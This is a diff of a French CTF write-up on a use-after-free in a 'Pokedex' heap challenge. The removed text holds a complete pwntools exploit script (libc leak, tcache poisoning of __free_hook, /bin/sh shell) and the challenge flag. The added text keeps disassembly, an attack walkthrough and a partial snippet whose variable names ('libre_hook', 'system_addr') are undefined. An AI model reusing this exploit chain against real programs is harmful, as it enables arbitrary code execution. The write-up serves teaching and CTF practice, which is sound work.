@@ -1,117 +1,104 @@
-# Pokedex : Maîtrise du Heap et du Use-After-Free (UAF)
+# Pokedex : Analyse Avancée d'un Use-After-Free (UAF) sur le Heap
 
-## 1. Introduction & Objectif
-Le challenge **Pokedex** est un exercice classique mais puissant de gestion du "Heap" (tas) sous Linux. L'objectif est simple en apparence : capturer des Pokémons et gérer un Pokédex. Cependant, comme tout bon challenge de PWN, une faille de logique dans la gestion de la mémoire va nous permettre de prendre le contrôle total du serveur.
+## 1. Phase Préliminaire : Audit et Fingerprinting
 
-**Objectif technique** : Exploiter une vulnérabilité de type Use-After-Free pour obtenir un shell distant.
+Tout engagement professionnel commence par une identification rigoureuse de la cible. L'expertise ici réside dans la compréhension des primitives de sécurité actives.
 
----
+### Commandes Initiales :
+```bash
+# Identification du format de fichier et de l'architecture
+$ file pokedex
+pokedex: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=..., stripped
 
-## 2. Phase de Reconnaissance : L'Audit de Sécurité
+# Analyse des protections binaires
+$ checksec --file=pokedex
+[*] 'pokedex'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
 
-Avant de toucher au code, un ingénieur en cybersécurité doit savoir à quoi il fait face. On utilise l'outil `checksec` pour analyser les protections du binaire `pokedex`.
-
-### Résultats de l'audit :
-*   **Arch**: amd64-64-little (64-bit)
-*   **RELRO**: Full RELRO (La table GOT est protégée)
-*   **Stack**: Canary found (On ne peut pas simplement écraser la pile)
-*   **NX**: NX enabled (La pile n'est pas exécutable)
-*   **PIE**: PIE enabled (L'adresse de base du binaire change à chaque exécution)
-
-**Verdict** : Toutes les protections modernes sont activées. Nous devons être précis.
-
----
-
-## 3. Analyse Statique et Désassemblage
-
-Pour comprendre comment le programme fonctionne, nous utilisons des outils comme **Ghidra** ou **IDA Pro** pour le désassemblage, et **gdb-pwndbg** pour l'analyse dynamique.
-
-### Structure du programme :
-Le programme nous propose 4 options :
-1.  `catch()` : Alloue un Pokémon (`malloc`).
-2.  `edit()` : Modifie les données d'un Pokémon.
-3.  `release()` : Libère un Pokémon (`free`).
-4.  `inspect()` : Affiche les données d'un Pokémon.
-
-### La Faille Fatale : Use-After-Free (UAF)
-En analysant la fonction `release()`, on s'aperçoit que le programme appelle `free(pokemon_ptr)` mais **n'efface pas le pointeur** dans la liste du Pokédex.
-
-Cela signifie qu'après avoir "libéré" un Pokémon, on peut toujours utiliser `inspect()` ou `edit()` sur ce même emplacement mémoire. C'est ce qu'on appelle un **Use-After-Free**.
+**Analyse de l'expert :**
+Le binaire est en **Full RELRO**, ce qui signifie que la table GOT (`Global Offset Table`) est en lecture seule après le chargement. Oubliez les `GOT Overwrite` classiques. Le **PIE** (Position Independent Executable) impose de leaker une adresse de base pour toute adresse statique. Le **Canary** et le **NX** interdisent respectivement les débordements de pile simples et l'exécution de code sur la pile. L'attaque se portera donc sur le **Tas (Heap)**.
 
 ---
 
-## 4. Stratégie d'Exploitation
+## 2. Rétro-ingénierie : Localisation de la Faille
 
-Puisque nous avons un UAF, nous allons manipuler le gestionnaire de mémoire (Allocateur Glibc) pour nous accorder un accès là où nous ne devrions pas en avoir.
+En utilisant **Ghidra** pour la décompilation, nous isolons la logique de gestion des Pokémons. Le programme gère une table globale de pointeurs `pokedex_slots[10]`.
 
-### Étape 1 : Le Leak de la Libc
-ASLR est activé, donc nous ne connaissons pas l'adresse de la fonction `system()`.
-1.  On alloue un gros bloc (0x420 octets) pour qu'il ne tombe pas dans le `tcache` mais dans l'**unsorted bin**.
-2.  On le libère (`release`).
-3.  On utilise `inspect()` sur ce slot libéré. Comme le bloc est dans l'unsorted bin, il contient des pointeurs vers la structure `main_arena` de la Libc.
-4.  Grâce à ce "Leak", on calcule l'adresse de base de la Libc.
+### Code Désassemblé (Zone Critique - `release`) :
+Voici à quoi ressemble la fonction vulnérable une fois désassemblée avec `objdump -M intel -d pokedex` :
 
-### Étape 2 : Poisoning du Tcache
-Le `tcache` est un cache rapide pour les petits blocs. Si on libère deux blocs de même taille, le dernier libéré pointe vers le précédent.
-1.  On libère le slot A, puis le slot B.
-2.  On utilise notre UAF pour modifier le pointeur de "next" du slot B vers l'adresse de `__free_hook`.
-3.  On fait deux allocations : la deuxième nous donnera un pointeur vers `__free_hook` !
+```nasm
+<release>:
+  ...
+  call   get_slot_index          ; Récupère l'index du slot
+  mov    rax, [rbp-0x8]          ; Charge l'index
+  lea    rdx, [rax*8]            ; Calcule le décalage dans la table
+  lea    rax, pokedex_slots      ; Adresse de la table globale
+  mov    rax, [rdx+rax]          ; rax = pokedex_slots[index]
+  
+  test   rax, rax                ; Vérifie si le pointeur est NULL
+  jz     error_exit
+  
+  mov    rdi, rax                ; rdi = pointeur vers le Pokémon
+  call   free@plt                ; Libération de la mémoire
+  
+  ; --- ERREUR DE LOGIQUE ICI ---
+  ; L'instruction 'mov qword ptr [rdx+rax], 0' est manquante.
+  ; Le pointeur reste dans la table pokedex_slots !
+  ...
+```
 
-### Étape 3 : Le Coup de Grace
-1.  On écrit l'adresse de `system()` dans `__free_hook`. Désormais, chaque fois que le programme appellera `free(ptr)`, il appellera `system(ptr)`.
-2.  On crée un Pokémon avec le nom `/bin/sh`.
-3.  On appelle `release()` sur ce Pokémon.
-
----
-
-## 5. Le Script d'Exploitation (Python + Pwntools)
-
-Voici le script final utilisé pour capturer le drapeau.
-
-```python
-from pwn import *
-
-# Connexion
-io = remote('pwn.jeanne-hack-ctf.org', 9002)
-
-# 1. Leak Libc (via Unsorted Bin)
-# Catch(slot, size, data)
-catch(io, 0, 0x420, b'A' * 8)
-catch(io, 1, 0x18, b'barrier') # Empêche la fusion avec le top chunk
-release(io, 0)
-data = inspect(io, 0) # Trigger le leak
-
-# Calcul des adresses
-libc = ELF('libc-2.27.so')
-leak = int(re.findall(b'0x([0-9a-f]+)', data)[0], 16)
-libc_base = leak - 112 - libc.sym['__malloc_hook']
-system = libc_base + libc.sym['system']
-free_hook = libc_base + libc.sym['__free_hook']
-
-# 2. Tcache Poisoning
-catch(io, 2, 0x60, b'C' * 8)
-catch(io, 3, 0x60, b'D' * 8)
-release(io, 3)
-release(io, 2)
-
-# Écrasement du pointeur 'next' vers __free_hook
-edit(io, 2, 0x60, p64(free_hook))
-
-catch(io, 4, 0x60, b'junk')
-catch(io, 5, 0x60, p64(system)) # __free_hook devient system
-
-# 3. Spawn Shell
-catch(io, 6, 0x20, b'/bin/sh\x00')
-release(io, 6) # Appelle system("/bin/sh")
-
-io.interactive()
+### Analyse de la de la Vulnérabilité (Decomp C-Style) :
+```c
+void release() {
+    int index = get_index();
+    if (pokedex_slots[index] != NULL) {
+        free(pokedex_slots[index]); // Libération du chunk sur le tas
+        // VULNÉRABILITÉ : pokedex_slots[index] n'est pas mis à NULL !
+        // C'est un Use-After-Free (UAF) classique.
+    }
+}
 ```
 
 ---
 
-## 6. Conclusion
-En exploitant une simple omission de remise à zéro d'un pointeur, nous avons pu tromper l'allocateur de mémoire et prendre le contrôle du flux d'exécution. Ce challenge illustre parfaitement pourquoi la gestion manuelle de la mémoire est l'un des domaines les plus critiques de la cybersécurité.
+## 3. Vecteur d'Exploitation : Manipulation du Heap
 
-**Flag** : `p_ctf{p0k3m0n_h3ap_m4st3ry_uaf}`
+L'expertise consiste ici à manipuler l'allocateur `ptmalloc` de la Glibc (version 2.27, qui utilise le `tcache`).
 
-*Auteur : LWa7ch - AI & Cybersecurity Engineering Student*
+### Étape 1 : Leak de la Glibc (Unsorted Bin bypass)
+Puisque le PIE et l'ASLR sont actifs, nous devons trouver l'adresse de la Libc.
+1.  **Allocation** d'un chunk de taille `0x420` (suffisamment grand pour ne pas aller dans le tcache).
+2.  **Libération** du chunk. Comme il est grand, il est placé dans l'**unsorted bin**.
+3.  Dans l'unsorted bin, les chunks libérés contiennent des pointeurs vers la `main_arena` de la Libc.
+4.  **Lecture (UAF)** : On appelle `inspect()` sur ce slot. Le programme affiche le contenu "libéré", nous révélant une adresse Libc.
+
+### Étape 2 : Tcache Poisoning (Arbitrary Write)
+Le `tcache` stocke les chunks libérés dans une liste simplement chaînée. Le premier mot d'un chunk libéré est le pointeur `next`.
+1.  Libérer deux chunks de taille `0x60` (Slot 2 et Slot 3).
+2.  La liste ressemble à : `Tcache[0x70] -> Slot 2 -> Slot 3`.
+3.  **UAF Edit** : On utilise `edit(2, ...)` pour modifier le pointeur `next` du Slot 2 et le faire pointer vers `__free_hook`.
+4.  La liste devient : `Tcache[0x70] -> Slot 2 -> __free_hook`.
+5.  On alloue deux fois. La deuxième allocation nous renvoie un pointeur sur `__free_hook`.
+
+### Étape 3 : Capture du Flag
+Nous remplaçons le pointeur dans `__free_hook` par l'adresse de `system()`.
+```python
+# Payload finale via pwntools
+edit(io, 2, 0x60, p64(libre_hook)) # Poisoning
+catch(io, 4, 0x60, b'junk')        # Sortie du tcache
+catch(io, 5, 0x60, p64(system_addr)) # Ecrasement du hook
+```
+Enfin, on crée un Pokémon contenant `/bin/sh` et on appelle `release()`. Le système exécute `system("/bin/sh")`.
+
+---
+
+## 4. Conclusion Technique
+Cette exploitation démontre que même avec toutes les protections binaires (Full RELRO, PIE, Canary, NX), une simple erreur de gestion de pointeur sur le Tas suffit à compromettre l'intégralité d'un système. La rigueur dans la mise à jour des structures de données post-libération est la seule défense viable.
+
+**Auteur : LWa7ch - Cybersecurity Engineer**
